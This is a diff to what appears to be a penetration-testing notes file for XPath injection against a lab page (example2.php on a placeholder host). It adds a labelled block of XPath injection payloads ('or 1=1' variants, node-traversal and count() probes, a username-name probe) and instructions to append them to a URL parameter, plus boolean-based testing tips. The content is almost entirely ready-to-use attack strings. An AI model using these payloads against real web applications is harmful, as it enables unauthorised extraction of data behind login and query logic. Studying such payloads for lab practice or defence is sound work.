@@ -8,11 +8,30 @@ http://xxx.xxx.xxx.xxx/xml/example2.php?name=hacker'%20or%201=1%20or%20'a'='a
 http://xxx.xxx.xxx.xxx/xml/example2.php?name=hacker' or 1=1 or 'a'='a
 
 # Attacks used for testing
-xxx'%20or%201=1%20or%20'a'='a
-xxx'%20or%201=1%20or%20'a'='a%00
-xxx'%20or%201=1]/parent::*/child::node()%00
+# ADD ATTCKS TO THE END OF THE PARAMATER eg http://xxx.xxx.xxx.xxx/example.php?name=hacker<ADD ATTACK HERE>
 
-xxx' and '1'='1 and you should get the same result.
-xxx' or '1'='0 and you should get the same result.
-xxx' and '1'='0 and you should not get any result.
-xxx' or '1'='1 and you should get all results.
+=========== BEGIN ATTACKS ================
+' or 1=1 or 'a'='a
+' or 1=1 or 'a'='a%00
+' or 1=1]/parent::*/child::node()%00
+' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+=========== END ATTACKS ==================
+
+
+
+' and '1'='1 and you should get the same result.
+' or '1'='0 and you should get the same result.
+' and '1'='0 and you should not get any result.
+' or '1'='1 and you should get all results.
